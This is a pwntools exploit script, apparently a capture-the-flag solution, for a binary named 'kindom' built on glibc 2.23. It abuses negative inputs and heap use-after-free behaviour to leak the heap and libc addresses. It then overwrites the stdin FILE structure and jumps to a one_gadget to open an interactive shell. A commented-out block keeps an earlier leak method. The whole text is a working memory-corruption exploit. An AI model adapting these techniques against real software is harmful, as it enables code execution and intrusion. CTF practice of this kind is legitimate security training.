from pwn import *
context.arch = 'amd64'

io = process("./kindom")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")

r = lambda :io.recv()
rn = lambda x:io.recv(x)
ru = lambda x:io.recvuntil(x)
rld = lambda: io.recvline(keepends = False)
rufd = lambda x:io.recvuntil(x,drop=False)
rud = lambda x:io.recvuntil(x,drop=True)
rl = lambda :io.recvline()
se = lambda x:io.send(x)
sel = lambda x:io.sendline(x)
sea = lambda x:io.sendafter(x)
sela = lambda x:io.sendlineafter(x)


def recruit(size,namesize=[],name=[]):
    ru('Give me your choice:\n')
    sel(str(1))
    ru('How many servents do you want to rescruit?\n')
    sel(str(size))
    if size<0:
        return 
    for i in range(size):
        ru('Input the name\'s size of this servent:')
        sel(str(namesize[i]))
        if namesize[i] != 0:
            ru("Input the name of this servent:")
            se(name[i])

def expel(index):
    ru('Give me your choice:\n')
    sel(str(2))
    ru("Tell me his index number:\n")
    sel(str(index))

def buy(c):
    ru('Give me your choice:\n')
    sel(str(3))
    ru('--90000yuan\n')
    sel(str(c))

def attack(addr,len):
    ru('Give me your choice:\n')
    sel(str(4))
    ru('excalibur?\n')
    se('Y')
    ru('out?\n')
    sel(str(addr))
    ru('(0-8)\n')
    sel(str(len))

ru('How much money do you want?\n')
sel("-1")
ru('Give me your choice:\n')
sel("1")
ru('How many servents do you want to rescruit?\n')
sel("-10000")

'''
## This leak was from Peanuts. peasnuts tql!
recruit(4,[0x20,0x20,0x10,0x10],[p64(0)+p64(100000),p64(0)+p64(100000),p64(0)+p64(100000),p64(0)+p64(100000)])
expel(0)
expel(1)
recruit(1,[0x20a00],['\0'])
expel(0)
io.recvuntil("Ok, I'll kill ")
libase = u64(io.recv(6).ljust(8,'\x00'))-(libc.sym['__malloc_hook']+0x10+88)
success("LIBC BASE -> %#x"%libase)
sleep(0.8)

expel(1)
expel(2)
recruit(1,[0x10],[p64(0)+p64(100000)])
expel(3)
expel(1)
recruit(1,[0x10],[p64(0)+p64(100000)])
expel(2)
io.recvuntil("Ok, I'll kill ")
hpbase = u64(io.recv(6).ljust(8,'\x00'))-0xf0
success("HEAP BASE -> %#x"%hpbase)
sleep(0.8)

buy(2)
attack(libase+libc.sym['_IO_2_1_stdin_']+56,1)
sleep(1)
ru(':')
sel(p64(libase+0x3c67a8)*4+p64(libase+0x3c67c8)+'\0'*0x3c+p64(libase+0x4526a))
'''

recruit(4,[0x10,0x10,0x10,0x10],[p64(0)+p64(0x21),'\0','\0','\0'])

expel(1)#-0
expel(2)#-1
recruit(1,[0x10],[p64(0)+p64(10000)])	#0 -> name
expel(0)#-2
expel(1)#-0
recruit(1,[0x10],[p64(0)+p64(0x21)])
expel(2)#-1
io.recvuntil("Ok, I'll kill ")
hpbase = u64(io.recv(6).ljust(8,'\x00'))-0x10
success("HEAP BASE -> %#x"%hpbase)
sleep(0.8)

expel(1)
expel(3)
expel(2)
expel(0)

recruit(3,[0x10,0x10,0x10],[p64(hpbase+0x30),'\0',p64(0)+p64(0xa1)])
expel(1)
expel(3)
io.recvuntil("Ok, I'll kill ")
libase = u64(io.recv(6).ljust(8,'\x00'))-(libc.sym['__malloc_hook']+0x10+88)
success("LIBC BASE -> %#x"%libase)
sleep(0.8)

buy(2)
attack(libase+libc.sym['_IO_2_1_stdin_']+56,1)
sleep(1)
ru(':')
sel(p64(libase+0x3c67a8)*4+p64(libase+0x3c67c8)+'\0'*0x3c+p64(libase+0x4526a))

io.interactive()
